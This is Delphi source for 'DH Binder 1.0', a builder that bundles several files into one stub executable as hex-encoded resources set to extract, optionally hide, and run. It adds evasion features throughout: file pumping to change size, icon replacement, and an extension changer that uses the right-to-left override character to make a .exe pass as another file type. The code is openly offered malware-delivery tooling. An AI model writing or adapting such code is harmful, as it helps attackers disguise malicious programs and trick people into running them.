// DH Binder 1.0
// (C) Doddy Hackman 2015
// Credits :
// Joiner Based in : "Ex Binder v0.1" by TM
// Icon Changer based in : "IconChanger" By Chokstyle
// Thanks to TM & Chokstyle

unit binder;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.StdCtrls,
  Vcl.ExtCtrls, ShellApi, Vcl.ImgList, Vcl.Menus, Vcl.Imaging.pngimage, madRes,
  StrUtils;

type
  TForm1 = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    PageControl2: TPageControl;
    TabSheet4: TTabSheet;
    TabSheet5: TTabSheet;
    GroupBox1: TGroupBox;
    PageControl3: TPageControl;
    TabSheet6: TTabSheet;
    TabSheet7: TTabSheet;
    TabSheet8: TTabSheet;
    files: TListView;
    StatusBar1: TStatusBar;
    GroupBox2: TGroupBox;
    archivo_nuevo: TEdit;
    Button1: TButton;
    GroupBox3: TGroupBox;
    execute: TComboBox;
    abrir: TOpenDialog;
    GroupBox4: TGroupBox;
    Button2: TButton;
    GroupBox5: TGroupBox;
    extraction: TComboBox;
    GroupBox6: TGroupBox;
    opcion_ocultar: TCheckBox;
    check_filepumper: TCheckBox;
    GroupBox7: TGroupBox;
    GroupBox8: TGroupBox;
    pumper_count: TEdit;
    UpDown1: TUpDown;
    pumper_type: TComboBox;
    check_extension_changer: TCheckBox;
    GroupBox9: TGroupBox;
    check_extension: TCheckBox;
    extensiones: TComboBox;
    GroupBox10: TGroupBox;
    check_this_extension: TCheckBox;
    extension: TEdit;
    GroupBox11: TGroupBox;
    ruta_icono: TEdit;
    Button3: TButton;
    GroupBox12: TGroupBox;
    use_icon_changer: TCheckBox;
    preview: TImage;
    imagenes: TImageList;
    menu: TPopupMenu;
    C1: TMenuItem;
    Image2: TImage;
    GroupBox13: TGroupBox;
    Button4: TButton;
    TabSheet9: TTabSheet;
    GroupBox14: TGroupBox;
    Image3: TImage;
    Label1: TLabel;
    D1: TMenuItem;
    abrir_icono: TOpenDialog;
    procedure Button1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure D1Click(Sender: TObject);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
// Functions

procedure file_pumper(archivo: string; cantidad: LongWord);
var
  arraycantidad: array of Byte;
  abriendo: TFileStream;
begin
  abriendo := TFileStream.Create(archivo, fmOpenReadWrite);
  SetLength(arraycantidad, cantidad);
  ZeroMemory(@arraycantidad[1], cantidad);
  abriendo.Seek(0, soFromEnd);
  abriendo.Write(arraycantidad[0], High(arraycantidad));
  abriendo.Free;
end;

procedure extension_changer(archivo: string; extension: string);
var
  nombre: string;
begin
  nombre := ExtractFileName(archivo);
  nombre := StringReplace(nombre, ExtractFileExt(nombre), '',
    [rfReplaceAll, rfIgnoreCase]);
  nombre := nombre + char(8238) + ReverseString('.' + extension) + '.exe';
  MoveFile(PChar(archivo), PChar(ExtractFilePath(archivo) + nombre));
end;

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

//

procedure TForm1.Button1Click(Sender: TObject);
begin
  if (abrir.execute) then
  begin
    archivo_nuevo.Text := abrir.FileName;
  end;
end;

procedure TForm1.Button2Click(Sender: TObject);
var
  icono: TIcon;
  listate: TListItem;
  getdata: SHFILEINFO;
begin

  if (FileExists(archivo_nuevo.Text)) then
  begin
    icono := TIcon.Create;
    files.Items.BeginUpdate;

    with files do
    begin

      listate := files.Items.Add;

      listate.Caption := ExtractFileName(archivo_nuevo.Text);
      listate.SubItems.Add(archivo_nuevo.Text);
      listate.SubItems.Add(ExtractFileExt(archivo_nuevo.Text));
      listate.SubItems.Add(execute.Text);

      SHGetFileInfo(PChar(archivo_nuevo.Text), 0, getdata, SizeOf(getdata),
        SHGFI_ICON or SHGFI_SMALLICON);
      icono.Handle := getdata.hIcon;
      listate.ImageIndex := imagenes.AddIcon(icono);

      DestroyIcon(getdata.hIcon);

    end;

    files.Items.EndUpdate;

    archivo_nuevo.Text := '';

    StatusBar1.Panels[0].Text := '[+] File Added';
    Form1.StatusBar1.Update;
  end
  else
  begin
    StatusBar1.Panels[0].Text := '[-] File not exists';
    Form1.StatusBar1.Update;
  end;

end;

procedure TForm1.Button3Click(Sender: TObject);
begin
  if (abrir_icono.execute) then
  begin
    ruta_icono.Text := abrir_icono.FileName;
    preview.Picture.LoadFromFile(abrir_icono.FileName);
  end;
end;

procedure TForm1.Button4Click(Sender: TObject);
var
  i: integer;
  nombre: string;
  ruta: string;
  tipo: string;
  savein: string;
  opcionocultar: string;
  lineafinal: string;
  uno: DWORD;
  tam: DWORD;
  dos: DWORD;
  tres: DWORD;
  todo: Pointer;
  change: DWORD;
  valor: string;
  stubgenerado: string;
  ruta_archivo: string;
  tipocantidadz: string;
  extensionacambiar: string;

begin

  StatusBar1.Panels[0].Text := '[+] Working ...';
  Form1.StatusBar1.Update;

  if (files.Items.Count = 0) or (files.Items.Count = 1) then
  begin
    ShowMessage('You have to choose two or more files');
  end
  else
  begin
    stubgenerado := 'done.exe';

    if (opcion_ocultar.Checked = True) then
    begin
      opcionocultar := '1';
    end
    else
    begin
      opcionocultar := '0';
    end;

    if (extraction.Items[extraction.ItemIndex] = '') then
    begin
      savein := 'USERPROFILE';
    end
    else
    begin
      savein := extraction.Items[extraction.ItemIndex];
    end;

    DeleteFile(stubgenerado);
    CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' +
      'Data/stub.exe'), PChar(ExtractFilePath(Application.ExeName) + '/' +
      stubgenerado), True);

    ruta_archivo := ExtractFilePath(Application.ExeName) + '/' + stubgenerado;

    uno := BeginUpdateResource(PChar(ruta_archivo), True);

    for i := 0 to files.Items.Count - 1 do
    begin

      nombre := files.Items[i].Caption;
      ruta := files.Items[i].SubItems[0];
      tipo := files.Items[i].SubItems[2];

      lineafinal := '[nombre]' + nombre + '[nombre][tipo]' + tipo +
        '[tipo][dir]' + savein + '[dir][hide]' + opcionocultar + '[hide]';
      lineafinal := '[63686175]' + dhencode(UpperCase(lineafinal), 'encode') +
        '[63686175]';

      dos := CreateFile(PChar(ruta), GENERIC_READ, FILE_SHARE_READ, nil,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
      tam := GetFileSize(dos, nil);
      GetMem(todo, tam);
      ReadFile(dos, todo^, tam, tres, nil);
      CloseHandle(dos);
      UpdateResource(uno, RT_RCDATA, PChar(lineafinal),
        MAKEWord(LANG_NEUTRAL, SUBLANG_NEUTRAL), todo, tam);

    end;

    EndUpdateResource(uno, False);

  end;

  //

  if (check_filepumper.Checked) then
  begin
    tipocantidadz := pumper_type.Items[pumper_type.ItemIndex];
    if (tipocantidadz = 'Byte') then
    begin
      file_pumper(ruta_archivo, StrToInt(pumper_count.Text) * 8);
    end;
    if (tipocantidadz = 'KiloByte') then
    begin
      file_pumper(ruta_archivo, StrToInt(pumper_count.Text) * 1024);
    end;
    if (tipocantidadz = 'MegaByte') then
    begin
      file_pumper(ruta_archivo, StrToInt(pumper_count.Text) * 1048576);
    end;
    if (tipocantidadz = 'GigaByte') then
    begin
      file_pumper(ruta_archivo, StrToInt(pumper_count.Text) * 1073741824);
    end;
    if (tipocantidadz = 'TeraByte') then
    begin
      file_pumper(ruta_archivo, StrToInt(pumper_count.Text) * 1099511627776);
    end;
  end;

  if (use_icon_changer.Checked) then
  begin
    try
      begin
        change := BeginUpdateResourceW
          (PWideChar(wideString(ruta_archivo)), False);
        LoadIconGroupResourceW(change, PWideChar(wideString(valor)), 0,
          PWideChar(wideString(ruta_icono.Text)));
        EndUpdateResourceW(change, False);
      end;
    except
      begin
        //
      end;
    end;
  end;

  if (check_extension_changer.Checked) then
  begin
    if not(check_extension.Checked and check_this_extension.Checked) then
    begin
      if (check_extension.Checked) then
      begin
        extensionacambiar := extensiones.Items[extensiones.ItemIndex];
        extension_changer(ruta_archivo, extensionacambiar);
      end;
      if (check_this_extension.Checked) then
      begin
        extension_changer(ruta_archivo, extension.Text);
      end;
    end;
  end;

  StatusBar1.Panels[0].Text := '[+] Done';
  Form1.StatusBar1.Update;

end;

procedure TForm1.C1Click(Sender: TObject);
begin
  files.Clear;
  imagenes.Clear;
end;

procedure TForm1.D1Click(Sender: TObject);
begin
  files.DeleteSelected;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  abrir.InitialDir := GetCurrentDir;
  abrir_icono.InitialDir := GetCurrentDir;
  abrir_icono.Filter := 'ICO|*.ico|';
end;

end.

// The End ?
